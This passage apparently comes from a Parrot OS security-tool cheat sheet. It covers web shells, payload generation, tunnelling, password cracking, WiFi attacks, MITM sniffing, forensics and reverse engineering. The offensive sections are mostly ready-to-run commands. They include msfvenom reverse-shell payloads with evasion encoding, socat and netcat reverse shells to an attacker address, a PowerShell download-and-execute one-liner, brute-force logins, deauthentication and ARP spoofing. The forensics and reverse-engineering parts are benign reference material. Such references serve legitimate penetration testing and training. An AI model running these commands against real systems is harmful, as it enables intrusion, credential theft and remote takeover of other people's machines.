Stealthy PHP web shell — generate, deploy, and manage PHP backdoors.

```bash
# Generate a password-protected web shell
weevely generate mypassword /tmp/shell.php

# Connect to deployed shell
weevely http://target.com/uploads/shell.php mypassword

# Inside weevely shell:
# :help                       - Show available modules
# :file.read /etc/passwd      - Read remote file
# :shell.sh                   - Full bash shell
# :audit.etcpasswd            - Read /etc/passwd
# :net.ifconfig               - Show network interfaces
# :sql.console                - SQL console
```

---

### `webshells`
Collection of pre-made web shells in PHP, ASP, JSP, and other languages.
Installed to `/usr/share/webshells/`

```bash
ls /usr/share/webshells/                       # List available shells
ls /usr/share/webshells/php/                   # PHP shells
ls /usr/share/webshells/asp/                   # ASP shells
ls /usr/share/webshells/jsp/                   # JSP shells

# PHP shells include:
# php-reverse-shell.php  - Edit $ip and $port then upload
# simple-backdoor.php    - ?cmd=whoami style
# php-findsock-shell.php
```

---

### `msfvenom` (Metasploit)
Generate shellcode and payloads for various platforms.

```bash
# Windows payloads
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.0.0.1 LPORT=443 -f exe > shell_https.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shellcode.bin

# Linux payloads
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > rev.elf

# Web payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.jsp
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx > shell.aspx

# Evasion
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 15 -f exe > encoded.exe
```

---

### `socat`
Multi-purpose network relay and reverse shell tool.

```bash
# Reverse shell (listener on attacker)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Reverse shell (on victim)
socat TCP:192.168.1.50:4444 EXEC:/bin/bash

# Encrypted reverse shell
socat OPENSSL-LISTEN:4444,cert=server.pem,reuseaddr,fork EXEC:/bin/bash  # Attacker
socat OPENSSL:192.168.1.50:4444,verify=0 EXEC:/bin/bash                  # Victim

# File transfer
socat TCP-LISTEN:4444 FILE:received.zip        # Receive
socat TCP:192.168.1.50:4444 FILE:send.zip      # Send

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80  # Forward port
```

---

### `proxychains4`
See Privacy section — tunnel tools through SOCKS proxies for pivoting.

```bash
# After compromising a machine and setting up a SOCKS proxy (e.g., Meterpreter)
# In Metasploit: use auxiliary/server/socks_proxy; set SRVPORT 1080; run
# Edit /etc/proxychains4.conf: socks5 127.0.0.1 1080

proxychains4 nmap -sT -Pn 172.16.0.0/24       # Scan internal network
proxychains4 ssh user@172.16.0.50              # Access internal SSH
proxychains4 evil-winrm -i 172.16.0.100 -u admin -p pass  # Internal WinRM
```

---

### `chisel`
Fast TCP/UDP tunnel over HTTP — useful for firewall pivoting.

```bash
# On attacker (server mode)
./chisel server -p 8080 --reverse

# On victim (client mode) - creates reverse SOCKS proxy
./chisel client 192.168.1.50:8080 R:socks

# Forward specific port
./chisel client 192.168.1.50:8080 R:3389:172.16.0.100:3389  # RDP pivot

# Then use proxychains:
proxychains4 xfreerdp /v:127.0.0.1 /u:admin /p:pass
```

---

### `netcat` (netcat-openbsd)
The classic networking Swiss Army knife.

```bash
# Reverse shell listener
nc -lvnp 4444

# Connect back (victim)
nc 192.168.1.50 4444 -e /bin/bash              # Linux
nc 192.168.1.50 4444 -e cmd.exe               # Windows

# File transfer
nc -lvnp 4444 > received.file                  # Receive
nc 192.168.1.50 4444 < file_to_send           # Send

# Port scanning
nc -zv 192.168.1.100 1-1000                   # TCP port scan
nc -zvu 192.168.1.100 1-1000                  # UDP scan
```

---

### `powershell`
PowerShell Core — for Windows exploitation, enumeration, and payload execution.

```bash
pwsh                                           # Interactive shell
pwsh -File script.ps1                          # Run script
pwsh -Command "Invoke-WebRequest -Uri http://10.0.0.1/shell.ps1 -OutFile /tmp/shell.ps1"

# Download and execute (common pentest pattern):
pwsh -c "IEX(New-Object Net.WebClient).downloadString('http://10.0.0.1/script.ps1')"
```

---

### `iodine`
DNS tunneling for bypassing firewalls.

```bash
# On server (requires a domain with NS record pointing to your server)
sudo iodined -f -c -P password 10.0.0.1 tunnel.example.com

# On client
sudo iodine -f -P password tunnel.example.com
# Creates tun0 interface at 10.0.0.2
```

---

### `stunnel4`
SSL/TLS tunneling — wrap plain connections in encryption.

```bash
# Create stunnel config
# /etc/stunnel/stunnel.conf:
# [https]
# accept = 443
# connect = 127.0.0.1:4444
# cert = /etc/stunnel/stunnel.pem

sudo stunnel /etc/stunnel/stunnel.conf         # Start tunnel
```

---

### `sliver`
Modern open-source C2 framework (cross-platform adversary emulation).

```bash
# Start Sliver server
sliver-server

# Inside Sliver console:
# generate --os windows --arch amd64 --format exe -l 192.168.1.50 -p 443 -o shell.exe
# mtls                   # MTLS listener
# http                   # HTTP listener
# use SESSION_ID         # Interact with session
# ls / ps / whoami / ifconfig / netstat  # Common commands
# upload /local/file remote/path         # Upload file
# download remote/path /local/dest       # Download file
```

---

## 8. Password Attacks

---

### `hashcat`
GPU-accelerated password cracker supporting 300+ hash types.

```bash
# Common hash modes
hashcat -m 0 hashes.txt wordlist.txt           # MD5
hashcat -m 100 hashes.txt wordlist.txt         # SHA1
hashcat -m 1000 hashes.txt wordlist.txt        # NTLM
hashcat -m 1800 hashes.txt wordlist.txt        # sha512crypt (Linux /etc/shadow)
hashcat -m 13100 hashes.txt wordlist.txt       # Kerberos TGS (Kerberoasting)
hashcat -m 18200 hashes.txt wordlist.txt       # Kerberos AS-REP (AS-REP Roasting)
hashcat -m 22000 hashes.txt wordlist.txt       # WPA2

# Attack modes
hashcat -m 0 -a 0 hashes.txt wordlist.txt      # Dictionary attack
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt  # Combinator attack
hashcat -m 0 -a 3 hashes.txt "?l?l?l?l?l?l"   # Brute-force (6 lowercase letters)
hashcat -m 0 -a 6 hashes.txt wordlist.txt "?d?d"  # Hybrid: word + 2 digits

# Rules
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/rockyou-30000.rule

# Masks (brute-force)
hashcat -m 0 -a 3 hashes.txt "?u?l?l?l?d?d"   # Uxxxdd pattern
hashcat -m 0 -a 3 hashes.txt "?a?a?a?a?a?a?a?a"  # 8 any chars

# Options
hashcat -m 1000 hashes.txt wordlist.txt --username  # Hashes have username prefix
hashcat -m 1000 hashes.txt wordlist.txt -o cracked.txt  # Save cracked
hashcat -m 1000 hashes.txt wordlist.txt --show  # Show already cracked
hashcat --benchmark                            # Benchmark all algorithms
```

---

### `john` (John the Ripper)
CPU-based password cracker with automatic format detection.

```bash
john hashes.txt                                # Auto-detect and crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  # Dictionary attack
john --wordlist=wordlist.txt --rules hashes.txt  # With word mangling rules
john --format=NT hashes.txt                    # Force NTLM format
john --format=sha512crypt hashes.txt           # sha512crypt (/etc/shadow)

# Specific operations
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt

john --show hashes.txt                         # Show cracked passwords
john --list=formats                            # List all supported formats

# Specific hash types
john --format=zip-opencl encrypted.zip --wordlist=wordlist.txt  # ZIP
john --format=rar5 encrypted.rar               # RAR
```

---

### `hydra`
Fast network login cracker for 50+ protocols.

```bash
# SSH brute-force
hydra -l root -P wordlist.txt 192.168.1.100 ssh
hydra -L users.txt -P passwords.txt 192.168.1.100 ssh
hydra -l admin -P wordlist.txt -t 4 192.168.1.100 ssh  # 4 threads (slow for SSH)

# HTTP/HTTPS
hydra -l admin -P wordlist.txt 192.168.1.100 http-get /admin/
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials"
hydra -l admin -P wordlist.txt https-post-form "192.168.1.100/login:user=^USER^&pass=^PASS^:Login failed"

# Other services
hydra -l admin -P wordlist.txt 192.168.1.100 ftp
hydra -l admin -P wordlist.txt 192.168.1.100 smb
hydra -l sa -P wordlist.txt 192.168.1.100 mssql
hydra -l admin -P wordlist.txt 192.168.1.100 mysql
hydra -l admin -P wordlist.txt 192.168.1.100 rdp -V

# Options
hydra -l admin -P wordlist.txt 192.168.1.100 ssh -v  # Verbose
hydra -l admin -P wordlist.txt 192.168.1.100 ssh -o results.txt  # Save
hydra -l admin -P wordlist.txt 192.168.1.100 ssh -f  # Stop on first found
```

---

### `medusa`
Fast parallel network login brute-forcer.

```bash
medusa -h 192.168.1.100 -u admin -P wordlist.txt -M ssh        # SSH
medusa -h 192.168.1.100 -u admin -P wordlist.txt -M ftp        # FTP
medusa -h 192.168.1.100 -u admin -P wordlist.txt -M http -m AUTH:BASIC  # HTTP Basic
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M smb  # SMB
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh       # Multiple hosts
```

---

### `crunch`
Generate custom wordlists with patterns and character sets.

```bash
crunch 6 8 abcdefghijklmnopqrstuvwxyz > wordlist.txt  # 6-8 length lowercase
crunch 8 8 -t @@@@%^^^ > pattern_wordlist.txt  # Pattern: @=lower %=digit ^=special
crunch 4 4 1234567890 > pins.txt               # 4-digit PINs
crunch 6 6 abcdef0123456789 > hex_words.txt   # Hex characters
crunch 8 8 "Company2024!" -o wordlist.txt      # Start with pattern
crunch 10 10 -f /usr/share/crunch/charset.lst mixalpha-numeric > words.txt  # Charset file
```

---

### `cewl`
Generate custom wordlists by spidering a website.

```bash
cewl http://target.com > wordlist.txt           # Spider and generate wordlist
cewl http://target.com -d 3 -m 5 > wordlist.txt  # Depth 3, min length 5
cewl http://target.com -e > emails.txt          # Also extract emails
cewl http://target.com --with-numbers > wordlist.txt  # Include numbers
```

---

### `hashid`
Identify hash types from a hash value.

```bash
hashid "5f4dcc3b5aa765d61d8327deb882cf99"      # Identify single hash
hashid -m hash.txt                              # Identify from file (with hashcat mode)
hashid -j hash.txt                             # JSON output
```

---

### `samdump2`
Dump NTLM password hashes from Windows SAM database.

```bash
samdump2 SYSTEM SAM                             # Dump hashes
samdump2 -o hashes.txt SYSTEM SAM              # Save to file
```

---

### `ophcrack` / `ophcrack-cli`
Crack Windows LM/NTLM hashes using rainbow tables.

```bash
ophcrack-cli -d /usr/share/ophcrack/tables/ -f hashes.txt  # Crack from file
ophcrack                                        # GUI version
```

---

### `wordlists`
Pre-installed wordlists in Parrot OS.

```bash
ls /usr/share/wordlists/                       # List available wordlists

# Key wordlists:
# /usr/share/wordlists/rockyou.txt             - Most famous 14M word list
# /usr/share/wordlists/dirb/common.txt         - Common web directories
# /usr/share/wordlists/dirb/big.txt            - Larger web directories
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# /usr/share/wordlists/fasttrack.txt           - Common passwords

# Unzip rockyou (if compressed)
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

---

## 9. Wireless Attacks

---

### `aircrack-ng` suite
The complete WiFi security auditing toolkit.

```bash
# Enable monitor mode
sudo airmon-ng start wlan0                     # Enable monitor on wlan0
sudo airmon-ng check kill                      # Kill interfering processes
sudo airmon-ng check                           # Check for interfering processes
sudo airmon-ng stop wlan0mon                   # Disable monitor mode

# Discover networks
sudo airodump-ng wlan0mon                      # Scan all networks
sudo airodump-ng --band bg wlan0mon           # 2.4GHz only
sudo airodump-ng --band a wlan0mon            # 5GHz only

# Capture WPA2 handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon  # Capture on channel 6
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon  # Deauth to force handshake

# Crack WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture*.cap
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture.cap

# WEP cracking
sudo airodump-ng -c 6 -w capture --bssid AA:BB:CC:DD:EE:FF wlan0mon  # Capture IVs
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon  # ARP replay to generate IVs
aircrack-ng capture*.cap                      # Crack WEP key

# Additional tools
airdecap-ng -w WPAKEY capture.cap            # Decrypt captured traffic
airolib-ng db --stats                         # Manage pre-computed PMK tables
airserv-ng                                    # Remote access daemon
```

---

### `wifite`
Automated WiFi hacking tool — runs airodump + aireplay + aircrack automatically.

```bash
sudo wifite                                    # Interactive — shows all networks
sudo wifite --dict /usr/share/wordlists/rockyou.txt  # With wordlist
sudo wifite -mac                               # Random MAC spoofing
sudo wifite --wpa                              # Only attack WPA networks
sudo wifite --kill                             # Kill interfering processes first
```

---

### `reaver`
Brute-force WPS PIN to recover WPA/WPA2 passphrases.

```bash
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv  # Basic attack
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv --no-nacks  # No NACKs
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -p 12345670  # Specific PIN
```

---

### `bully`
Alternative WPS brute-force tool.

```bash
sudo bully -b AA:BB:CC:DD:EE:FF -e "NetworkName" -c 6 wlan0mon  # Basic attack
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -S -F -B -v 3 wlan0mon     # Verbose attack
```

---

### `cowpatty`
Dictionary attack against WPA/WPA2 pre-shared keys.

```bash
cowpatty -r capture.cap -f wordlist.txt -s "NetworkSSID"  # Crack PSK
cowpatty -r capture.cap -d hashdb -s "NetworkSSID"        # With rainbow table
```

---

### `pixiewps`
Offline WPS Pixie Dust attack.

```bash
pixiewps -e enrollee_PKE -r registrar_PKE -s e_hash1 -z e_hash2 -a authkey -n e_nonce
# Used with reaver: reaver ... --pixie-dust
```

---

### `airgeddon`
Multi-purpose WiFi security auditing tool with menu interface.

```bash
sudo airgeddon                                 # Launch interactive menu
# Supports: WPA/WPA2 handshake capture and cracking, Evil Twin AP,
# WPS attacks, PMKID attack, DoS, captive portals
```

---

### `bettercap`
Modern MITM framework for network attacks and monitoring.

```bash
sudo bettercap                                 # Interactive console
sudo bettercap -iface eth0                     # Specify interface
sudo bettercap -eval "net.probe on; net.recon on; help"  # Startup commands

# Inside bettercap console:
# net.recon on             - Discover hosts
# net.probe on             - Probe for hosts  
# arp.spoof on             - Enable ARP spoofing
# net.sniff on             - Start sniffing
# https.proxy on           # HTTPS interception (requires cert)
# set arp.spoof.targets 192.168.1.100  # Target specific host
# wifi.recon on            # WiFi scanning
# wifi.deauth AA:BB:CC:DD:EE:FF  # Deauth attack
```

---

### Bluetooth Tools

```bash
# btscanner — Bluetooth scanner
sudo btscanner                                 # Launch interactive scanner

# blueranger — Bluetooth range estimation
sudo blueranger.py hci0 AA:BB:CC:DD:EE:FF    # Range to device

# bluesnarfer — Access Bluetooth phone files
bluesnarfer -r 1-10 -C 5 -b AA:BB:CC:DD:EE:FF  # Read phonebook

# bluelog — Bluetooth discovery logger
sudo bluelog -i hci0 -o /tmp/bt.log -u -c    # Log devices

# hcitool — HCI tool for Bluetooth management
hcitool scan                                   # Scan for devices
hcitool info AA:BB:CC:DD:EE:FF               # Device info
```

---

## 10. Sniffing & Spoofing

---

### `wireshark`
GUI network protocol analyzer.

```bash
wireshark                                      # Launch GUI
wireshark -i eth0                              # Open with interface
wireshark capture.pcap                         # Open pcap file

# CLI via tshark
tshark -i eth0                                 # Live capture
tshark -r capture.pcap -Y "http"              # Filter HTTP
tshark -r capture.pcap -T fields -e ip.src -e http.host  # Extract fields
tshark -r capture.pcap -z conv,tcp            # TCP conversations
tshark -r capture.pcap --export-objects http,/tmp/extracted/  # Extract files
```

---

### `tcpdump`
Command-line packet capture.

```bash
sudo tcpdump -i eth0                           # Capture all traffic
sudo tcpdump -i eth0 -w capture.pcap          # Write to file
tcpdump -r capture.pcap                        # Read from file
sudo tcpdump -i eth0 port 80                   # HTTP only
sudo tcpdump -i eth0 host 192.168.1.100        # Filter by host
sudo tcpdump -i eth0 'tcp port 443'           # HTTPS traffic
sudo tcpdump -i eth0 -n -X                     # Hex+ASCII output
sudo tcpdump -i eth0 -A                        # ASCII output
sudo tcpdump -i any                            # All interfaces
```

---

### `ettercap`
MITM attack framework — ARP poisoning, sniffing, password interception.

```bash
# GUI mode
sudo ettercap -G

# Text mode — ARP poison between gateway and target
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//

# Sniff all traffic on the LAN
sudo ettercap -T -q -i eth0

# With a specific plugin
sudo ettercap -T -q -i eth0 -M arp -P dns_spoof /192.168.1.1// /192.168.1.100//
```

---

### `mitmproxy`
Interactive HTTP/HTTPS man-in-the-middle proxy.

```bash
mitmproxy -p 8080                              # Interactive mode
mitmweb -p 8080                                # Web UI mode
mitmdump -p 8080                               # Non-interactive dump
mitmdump -w capture.pcap                       # Write to file
mitmdump -s script.py                          # With Python addon
mitmdump --mode transparent                    # Transparent mode
```

---

### `responder`
LLMNR/NBT-NS/mDNS poisoner and credential capture tool.

```bash
sudo responder -I eth0                         # Poison all protocols
sudo responder -I eth0 -w                      # Also run WPAD server
sudo responder -I eth0 -F                      # Force NTLM auth
sudo responder -I eth0 -P                      # Proxy auth
sudo responder -I eth0 -A                      # Analyze mode (no poisoning)

# View captured hashes
cat /usr/share/responder/logs/*.txt
cat /var/log/responder/Responder-Session.log
```

---

### `dsniff`
Network credential sniffer for various protocols (FTP, SMTP, POP, IMAP, etc.).

```bash
sudo dsniff -i eth0                            # Sniff passwords
sudo dsniff -p capture.pcap                    # From pcap file
sudo urlsnarf -i eth0                          # Sniff HTTP URLs
sudo webspy -i eth0                            # Mirror web browsing in browser
sudo dnsspoof -i eth0                          # DNS spoofing
sudo macof -i eth0                             # MAC flooding (CAM overflow)
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1  # ARP spoof target→gateway
```

---

### `netsniff-ng`
High-performance network toolkit — capture, replay, analyze.

```bash
sudo netsniff-ng --in eth0 --out capture.pcap  # Capture to file
sudo netsniff-ng --in capture.pcap --out eth0  # Replay from file
sudo netsniff-ng --in eth0 --filter "tcp port 80"  # With BPF filter
sudo trafgen --in trafgen.cfg --out eth0      # Generate traffic
sudo astraceroute -d 8.8.8.8 -i eth0         # Extended traceroute
```

---

### `dnschef`
Highly configurable DNS proxy for MITM DNS attacks.

```bash
sudo dnschef --fakeip 192.168.1.50            # Respond all queries with fake IP
sudo dnschef --fakeip 192.168.1.50 --fakedomains "*.evil.com"  # Specific domain
sudo dnschef --fakeip 192.168.1.50 --interface 0.0.0.0  # Listen on all interfaces
```

---

### `sslsplit`
Transparent SSL/TLS interception.

```bash
# Generate CA cert first
openssl req -new -x509 -days 1024 -extensions v3_ca -keyout ca.key -out ca.crt -subj "/CN=FakeCA"

# Start sslsplit
sudo sslsplit -D -l connections.log -j /tmp/jaildir/ -S /tmp/logdir/ \
  SSL 0.0.0.0 8443 192.168.1.100 443 \
  TCP 0.0.0.0 8080 192.168.1.100 80
```

---

## 11. Digital Forensics

---

### `autopsy`
Graphical digital forensics platform built on Sleuth Kit.

```bash
autopsy                                        # Launch GUI
# Add new case → add disk image (E01, raw, VMDK, etc.)
# Run ingest modules: hash lookup, file type ID, keyword search, etc.
```

---

### `sleuthkit` suite (fls, icat, mmls, fsstat, tsk_recover, etc.)

```bash
# Partition layout
mmls image.dd                                  # Show partitions
mmls -t dos image.dd                           # Force DOS table

# File system details
fsstat image.dd                                # File system info
fsstat -o 2048 image.dd                        # With sector offset

# List files
fls image.dd                                   # Root directory
fls -r image.dd                                # Recursive
fls -d image.dd                                # Deleted files only
fls -r -m / image.dd > bodyfile.txt            # Create bodyfile

# Extract files
icat image.dd 128 > recovered_file            # By inode
tsk_recover image.dd /cases/recovered/        # Recover all files
tsk_recover -e image.dd /cases/              # Include deleted files

# Timeline
mactime -b bodyfile.txt -d > timeline.csv
```

---

### `dc3dd` / `dcfldd`
Forensic imaging tools with hashing.

```bash
# dc3dd
dc3dd if=/dev/sdb of=/cases/image.dd hash=sha256 hlog=/cases/hash.log
dc3dd if=/dev/sdb ofs=/cases/image.dd.000 ofsz=2G  # Split image

# dcfldd
dcfldd if=/dev/sdb of=/cases/image.dd hash=sha256,md5 hashlog=/cases/hash.log
```

---

### `foremost`
File carving from disk images.

```bash
foremost -i image.dd -o /cases/foremost_out/   # Carve all file types
foremost -t jpeg,pdf,doc -i image.dd -o output/ # Specific types
foremost -v -i image.dd -o output/             # Verbose
```

---

### `scalpel`
Fast file carver.

```bash
scalpel image.dd -o /cases/scalpel_out/        # Carve from image
scalpel -c /etc/scalpel/scalpel.conf image.dd -o output/  # Custom config
```

---

### `binwalk`
Firmware image analysis and extraction (also useful for forensics).

```bash
binwalk image.bin                              # Scan for embedded files
binwalk -e image.bin                           # Extract
binwalk -M image.bin                           # Recursive extraction
binwalk -E image.bin                           # Entropy analysis (detect encryption)
```

---

### `volatility3`
Memory forensics (if installed; also available via Parrot repo).

```bash
vol3 -f memory.dmp windows.info                # Image info
vol3 -f memory.dmp windows.pslist              # Process list
vol3 -f memory.dmp windows.netscan             # Network connections
vol3 -f memory.dmp windows.malfind            # Find injected code
vol3 -f memory.dmp windows.hashdump           # Password hashes
vol3 -f memory.dmp linux.pslist               # Linux processes
```

---

### `regripper`
Parse Windows registry hives.

```bash
rip.pl -r NTUSER.DAT -f ntuser > output.txt   # All NTUSER.DAT plugins
rip.pl -r SYSTEM -p usbstor                    # USB devices
rip.pl -r SAM -p samparse                     # User accounts
rip.pl -l                                      # List all plugins
```

---

### `guymager`
Forensic disk imager with GUI.

```bash
sudo guymager                                  # Launch GUI
# Acquire image (E01, AFF, raw), compute hashes, verify integrity
```

---

### `ewf-tools` (ewfacquire, ewfexport, ewfinfo, ewfmount)

```bash
ewfinfo image.E01                              # Show metadata
ewfmount image.E01 /mnt/ewf/                  # Mount E01
ewfexport -t /cases/raw image.E01             # Export to raw
ewfacquire /dev/sdb                            # Acquire to E01
```

---

### `bulk_extractor`
Extract artifacts from disk images and memory.

```bash
bulk_extractor -o output/ image.dd             # Full extraction
bulk_extractor -e email -o output/ image.dd    # Emails only
bulk_extractor -e net -o output/ image.dd      # Network artifacts
```

---

### `yara`
Scan files for malware using rules.

```bash
yara rules.yar malware.exe                     # Scan with rule
yara -r rules/ /mnt/evidence/                 # Recursive scan
yara -s rules.yar malware.exe                  # Show matching strings
```

---

### `pdf-parser` / `pdfid`
PDF forensic analysis.

```bash
pdfid.py malware.pdf                           # Quick scan for JS, /OpenAction
pdf-parser.py malware.pdf                      # Full structure analysis
pdf-parser.py -s /JS malware.pdf              # Search for JavaScript
pdf-parser.py -o 10 malware.pdf               # Inspect object 10
```

---

### `dumpzilla`
Extract Firefox forensic data from profiles.

```bash
dumpzilla /home/user/.mozilla/firefox/profile/ --All  # Everything
dumpzilla /home/user/.mozilla/firefox/profile/ --History  # History only
dumpzilla /home/user/.mozilla/firefox/profile/ --Passwords  # Saved passwords
dumpzilla /home/user/.mozilla/firefox/profile/ --Bookmarks  # Bookmarks
dumpzilla /home/user/.mozilla/firefox/profile/ --Cookies    # Cookies
```

---

### `gpp-decrypt`
Decrypt Windows Group Policy Preferences passwords.

```bash
gpp-decrypt "ENCRYPTED_PASSWORD_STRING"        # Decrypt GPP password
# Finds passwords in: \\DC\SYSVOL\domain\Policies\**\Groups.xml
```

---

### `xplico`
Network forensics analysis — reconstruct sessions from pcap files.

```bash
sudo service xplico start                      # Start Xplico web server
# Access: http://127.0.0.1:9876
# Upload pcap → reconstruct emails, web, VoIP, chat sessions
```

---

## 12. Reverse Engineering

---

### `ghidra`
NSA's open-source reverse engineering suite.

```bash
ghidra                                         # Launch GUI
analyzeHeadless /project proj -import malware.exe -postScript PrintAST.java
```

---

### `rizin` / `rizin-cutter`
Reverse engineering framework (radare2 fork) with optional GUI.

```bash
rizin malware.exe                              # Interactive mode
rizin -A malware.exe                           # Auto-analyze
rizin -c "aaa; afl; pdf @ main" malware.exe   # Run commands
rizin-cutter malware.exe                       # GUI (Cutter)

# Common rizin commands:
# aaa    - Analyze all
# afl    - List functions
# pdf    - Disassemble function
# iz     - Strings
# ii     - Imports
# iE     - Exports
# VV     - Visual graph mode
```

---

### `gdb` / `cgdb`
GNU debugger for ELF binaries.

```bash
gdb malware.elf                                # Start debugger
gdb -p 1234                                    # Attach to PID
cgdb malware.elf                               # cgdb - curses frontend for gdb

# Key GDB commands:
# run                  - Start execution
# break main           - Breakpoint at main
# break *0x401000      - Breakpoint at address
# continue             - Continue
# next / step          - Step over / into
# info registers       - Show registers
# x/10x $rsp           - Examine memory
# disassemble main     - Disassemble function
# bt                   - Backtrace
# info proc map        - Memory map
```

---

### `edb-debugger`
Linux GUI debugger for x86/x64 ELF binaries.

```bash
edb --run malware.elf                          # Launch and run
edb --attach 1234                              # Attach to PID
```

---

### `dex2jar`
Convert Android DEX to Java JAR for decompilation.

```bash
d2j-dex2jar.sh malware.apk                    # Convert APK to JAR
d2j-dex2jar.sh classes.dex -o output.jar      # Convert .dex to .jar
```

---

### `smali` / `baksmali`
Assemble/disassemble Android Dalvik bytecode.

```bash
baksmali d classes.dex -o smali_output/       # Disassemble DEX
smali a smali_output/ -o classes_new.dex       # Reassemble
```

---

### `javasnoop`
Hook and modify Java methods at runtime.

```bash
javasnoop                                      # Launch GUI
# Attach to running JVM process and intercept method calls
```

---

### `firmware-mod-kit`
Extract and rebuild firmware images.

```bash
./extract-firmware.sh firmware.bin             # Extract firmware
./build-firmware.sh                            # Rebuild modified firmware
# Extract to ./fmk/ directory
```

---

### `flasm`
Disassemble Flash (SWF) ActionScript bytecode.

```bash
flasm malware.swf                              # Disassemble SWF
flasm -d malware.swf      